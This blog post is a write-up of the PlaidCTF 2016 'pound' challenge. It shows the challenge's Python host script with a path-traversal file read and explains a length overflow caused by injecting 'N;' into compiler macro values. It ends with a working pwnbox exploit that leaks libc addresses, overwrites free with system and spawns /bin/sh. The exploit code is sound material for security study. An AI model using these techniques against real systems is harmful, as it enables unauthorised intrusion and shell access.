---
layout: post
title: pctf 2016 pound writeup
category: writeup
---

## host.py

```python
#!/usr/bin/python
import os
import hashlib
import subprocess
import time



def menu():
    print """
    1. Read Trump article
    2. Run Trump Money Simulator
    3. Quit
    """
    try:
        res = int(raw_input())
        if res <= 0 or res > 3:
            return -1
        else:
            return res
    except:
        return -1

def read_tweet():
    print "Read the top 20 tweets by Trump!"
    print "Enter a number (1 - 20)"
    tweet_number = raw_input()
    time.sleep(5)

    try:
        with open("tweets/{0}".format(tweet_number), 'r') as f:
            print f.read()
    except:
        print "Invalid input!"

def run_sim():
    print "Trump's money simulator (that makes america great again) simulates two different sized states transfering money around, with the awesome Trump algorithm."
    print "The simulator takes in 2 inputs. Due to the awesomeness of the simulator, we can only limit the input to less than a thousand each..."

    input1 = raw_input("[Smaller] State 1 Size:")
    input2 = raw_input("[Larger] State 2 Size:")
    if len(input1) > 3 or len(input2) >3:
        print "Number has to be less than 1000"
        return

    str_to_hash = "[]{0}[]{1}##END".format(input1,input2)
    sim_id = hashlib.sha256(str_to_hash).hexdigest()
    sim_name = "sims/sim-{0}".format(sim_id)

    if os.path.isfile(sim_name):
        print "Sim compiled, running sim..."
    else:
        print "Compiling Sim"
        ret = subprocess.call(["clang", "-m32", "-DL1={}".format(input1),
                        "-DL2={}".format(input2), "pound.c", "-o",
                        sim_name])
        if ret != 0:
            print "Compiler error!"
            return

    os.execve("/usr/bin/sudo", ["/usr/bin/sudo", "-u", "smalluser", sim_name], {})



def main():
    print "Welcome to the Trump Secret Portal"
    while 1:
        res = menu()
        if res == 1:
            read_tweet()
        elif res == 2:
            run_sim()
        elif res == 3:
            exit(0)

if __name__ == "__main__":
    main()

```

at read_tweet, you can read any file in server with sending "../pound.c" or anyting. so I found pound.c

## pound.c

critical point is 

```c
const int N = 1024; // General buffer size
...
const int l1_len = L1;
const int l2_len = L2;
```

so you can define l1_len and l2_len by clang argument

```c
void propagate_forward(int k) {
    // Somewhere total_length will be used :), with some buffer or heap
    int length_diff = L2 - L1;
    int i,j;

    for (i=0; i < L1-1; i++) {
        // At random, swap money to keep circulation of money
        if (rand() % 2) {
            int tmp = global.s1_citizens[i];
            global.s1_citizens[i] = global.s2_citizens[i];
            global.s2_citizens[i] = tmp;
        }

        // Propagate forward s1
        if (global.s1_citizens[i] >= k) {
            global.s1_citizens[i] -= k;
            global.s1_citizens[i+1] += k;

            // If we reach a bankrupt person,
            // give him the money
            if (global.s1_citizens[i+1] == k) {
                return;
            }
        }

        // Propagate forward s2
        if (global.s2_citizens[i] >= k) {
            global.s2_citizens[i] -= k;
            global.s2_citizens[i+1] += k;

            // If we reach a bankrupt person,
            // give him the money
            if (global.s2_citizens[i+1] == k) {
                return;
            }
        }
    }

    for (j=0; j < length_diff; j++) {
        // Propagate forward s2
        if (global.s2_citizens[i+j] >= k) {
            global.s2_citizens[i+j] -= k;
            global.s2_citizens[i+j+1] += k;

            printf("%d:0x%x\n", i+j+1,global.s2_citizens[i+j+1]);
            // If we reach a bankrupt person,
            // give him the money
            if (global.s2_citizens[i+j+1] == k) {
                return;
            }
        }
    }

}
```

at this code, length_diff = L2 - L1. but, if you give
L2 -> N;
L1 -> N

then
 
> length_diff = N; -N;

so we can make overflow in this function.

# exploit

 1. set all citizens & names
 2. call one propagate_forward to give address(to leak and overwrite)
 3. call one propagate_forward to give length
 4. leak printf
 5. overwrite free -> system
 6. change announcement_length to free current chunk
 7. write new chunk /bin/sh and free it!

exploit code : 

```python
import pwnbox
import struct

local = False

if local:
    p = pwnbox.pipe.ProcessPipe('gdb -q poundN')
else:
    p = pwnbox.pipe.SocketPipe('pound.pwning.xxx', 9765)

if local:
    p.read_until('(gdb)')
    p.write('r\n')

else:
#p.interact()
    p.read_until('3. Quit')
    p.write('2\n')

    p.read_until('Size:')
    p.write('N\n')
    p.read_until('Size:')
    p.write('N;\n')

def lobby():
    p.read_until('Choice:')

def first_in():
    p.read_until('state:')
    p.write('\x70'*512)
    p.read_until('state:')
    p.write('A'*(512-2))
    lobby()

def create_An(d, s):
    p.write('4\n')
    p.read_until(':')
    p.write('%d\n' % d)
    p.write(s+'\n')
    lobby()

def init(d):
    p.write('1\n')
    p.read_until('in:')
    p.write('%d\n' % d)
    lobby()

def for_propa(d):
    p.write('2\n')
    p.read_until('propagate:')
    p.write('%d\n' % d)
    lobby()


def print_leak():
    p.write('0\n')
    p.read_until('PSA: ')
    x = p.read_byte(8)
    x = struct.unpack('<II',x)
    lobby()
    return x

target = 0x0804b00c


first_in()

init(1094795585)

for_propa(target)
for_propa(100)


x = print_leak()

libc_printf = x[0]
libc_strcspn = x[1]

libc_base = libc_printf - 0x4cc40
libc_system = libc_base + 0x3fcd0
libc_fgets = libc_base + 0x63120
libc_malloc = libc_base + 0x75b30

print hex(libc_base)


create_An(30,struct.pack('<IIIII',libc_printf,libc_strcspn,libc_system,libc_fgets,libc_malloc))
create_An(200, '/bin/sh')

p.write('4\n')
p.read_until(':')
p.write('300\n')


p.interact()
```


